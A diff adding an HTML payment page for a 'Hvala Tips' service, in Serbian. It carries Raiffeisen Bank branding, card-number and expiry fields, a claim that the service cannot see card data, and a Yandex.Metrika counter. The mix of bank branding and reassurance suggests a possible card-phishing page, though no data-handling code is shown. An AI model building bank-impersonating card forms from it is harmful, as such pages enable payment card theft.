@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Hvala Tips </title>
+    <link rel='stylesheet' href='css/reset.css'>
+    <link rel='stylesheet' href='css/fonts.css'>
+    <link rel='stylesheet' href='css/main.css'>
+    <link rel='stylesheet' href='css/media.css'>
+    <link rel='stylesheet' href='css/app.css'>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+    <script src="/js/jquery_i18n/CLDRPluralRuleParser.js"></script>
+    <script src="/js/jquery_i18n/jquery.i18n.js"></script>
+    <script src="/js/jquery_i18n/jquery.i18n.messagestore.js"></script>
+    <script src="/js/jquery_i18n/jquery.i18n.fallbacks.js"></script>
+    <script src="/js/jquery_i18n/jquery.i18n.language.js"></script>
+    <script src="/js/jquery_i18n/jquery.i18n.parser.js"></script>
+    <script src="/js/jquery_i18n/jquery.i18n.emitter.js"></script>
+    <script src="/js/jquery_i18n/jquery.i18n.emitter.bidi.js"></script>
+
+    <script type="text/javascript" src="js/lang_js/current_lang.js"></script>
+    <script src="https://unpkg.com/imask"></script>
+</head>
+
+<body>
+    <div class="tips">
+        <div class="container tips__container" style="width: 690px;padding: 0 10px;">
+            <div class="header__logo tips__logo">
+                <a href="/">
+                    <span>hvala.</span>
+                    <span>tips</span>
+                </a>
+                <div id="switch_lang" style="display: flex;align-items: center;margin-right: 20px;cursor: pointer;">
+                    <img src="/public/img/globe.png" alt="icon">
+                    <p class="btn_header" id="lang">Serbian</p>
+                </div>
+                <img src="img/raiffeisen_bank.png" class="logo_bank" alt="img-raiffeisen_bank">
+            </div>
+
+            <div class="header-block">
+                <div class="p-title" data-i18n="hvalatips-title1">Unesite informacije o kartici</div>
+                <div class="p-subtitle" data-i18n="hvalatips-title2">Detalji placanja</div>
+                <div class="btn_g_a_pay">
+                   <a href=""  id="goo_pay"></a>
+                   <a href="" id="app_pay"></a>
+                    
+                </div>
+            </div>
+
+            <div class="form-block">
+                <form action="" style="margin-bottom: 40px;">
+                   <!--
+                    <div class="input_1_2" style="display: flex;gap: 16px;width: 100%;">
+                        <div style="width: inherit;">
+                            <p>ID naloga</p>
+                            <input type="text" class='gray-input' id='id_naloga' disabled>
+                        </div>
+                        <div style="width: inherit;">
+                            <p>Trgovac</p>
+                            <input type="text" class='gray-input' id='trgovac' disabled>
+                        </div>                        
+                    </div>
+
+                    <div style="margin-top: 28px;">
+                        <p>Opis</p>
+                        <input type="text" class='gray-input' id='opis' disabled>
+                    </div>
+
+                    <div style="margin-top: 28px;">
+                        <p>Iznos</p>
+                        <input type="text" class='gray-input' id='iznos' >
+                    </div>
+                    -->
+                    <!--<div style="margin-top: 28px;">
+                        <p>Email</p>
+                        <input type="email" class='white-input' placeholder="Enter your email" id='email'>
+                    </div>-->
+
+                    <div style="margin-top: 28px;">
+                        <div style="display: flex;align-items: center;">
+                            <p style="margin-right: 11px;" data-i18n="hvalatips-title3">Broj cartice</p>
+                            <img src="img/mc_visa.png" alt="" class="mc_visa_mob">  
+                        </div>
+                        <div style="display: flex;align-items: center;">
+                            <input type="text" class='white-input img_card' id='broj_cartice' data-id="0" placeholder='000-0000000000000-00'>
+                            <img src="img/disabled.png" alt="" id="disabled" class="check">
+                            <img src="img/active.png" alt="" id="active" class="check" style="display: none;">
+                            <img src="img/mc_visa.png" alt="" class="mc_visa">                            
+                        </div>                                                
+                    </div>
+
+                    <div style="display: flex;flex-wrap: wrap;justify-content: space-between;">
+                        <div style="
+                            width: inherit;
+                            display: flex;
+                            align-items: center; 
+                            margin-top: 28px;
+                            margin-right: 15px;                           
+                            ">
+                            <p style="margin-right: 20px;" data-i18n="hvalatips-title4">Datum isteka</p>
+                            <input type="text" class='white-input data' id='mouth' data-id="0" placeholder='00'>
+                            <p style="font-size: 30px;margin: 0 10px;">/</p>
+                            <input type="text" class='white-input data' id='year'  data-id="0" placeholder='00'>
+                        </div>
+                        <!--
+                        <div style="display: flex;align-items: center;margin-top: 28px;">
+                            <div class="input_cvv">
+                                <p>CVV2</p>
+                                <p style="color: #5E5E5E;">Security code</p>
+                            </div>
+                            <input type="text" class='white-input cvv' id='cvv' data-id="0" placeholder='000'>                            
+                        </div>
+                        -->
+                    </div>
+
+                    <p style="margin-top: 21px;" data-i18n="hvalatips-title5">*Usluga nema pristup podacima o vašoj kartici, sve operacije se obavljaju na strani banke</p>
+                    <div style="
+                        margin-top: 21px;
+                        font-family: 'Proxima Nova';
+                        font-size: 18px;
+                        font-weight: 400;
+                        color: #393C49;">
+                        <span data-i18n="hvalatips-title6">Vratite se do </span><a href="#" style="color: #02964C;" data-i18n="hvalatips-title7">Sajt trgovca </a><span data-i18n="hvalatips-title8">(bez kompletiranja placanja)</span>
+                    </div>
+                    <button type="submit" class="btn" id="btn_pay" data-i18n="hvalatips-btn1" disabled>Nastaviti</button>
+                    <span class="under_info"><span style="color: #EA7C69;" data-i18n="hvalatips-title9">Napomena: </span><span data-i18n="hvalatips-title10">U sledecem koraku moze biti zahtevana verifikacija placanja preko Banke izdavaoca kartice.</span>
+                </form>
+            </div>            
+        </div>
+    </div>
+    
+<!-- Yandex.Metrika counter --> <script type="text/javascript" > (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://cdn.jsdelivr.net/npm/yandex-metrica-watch/tag.js", "ym"); ym(88190180, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true }); </script> <noscript><div><img src="https://mc.yandex.ru/watch/88190180" style="position:absolute; left:-9999px;" alt="" /></div></noscript> <!-- /Yandex.Metrika counter -->
+<!-- <script src="https://use.fontawesome.com/4081c3d3cf.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script> -->
+
+<script src="js/main.js"></script>
+
+</body>
+<script type="text/javascript" src="js/lang_js/switch_lang.js"></script>
+</html>
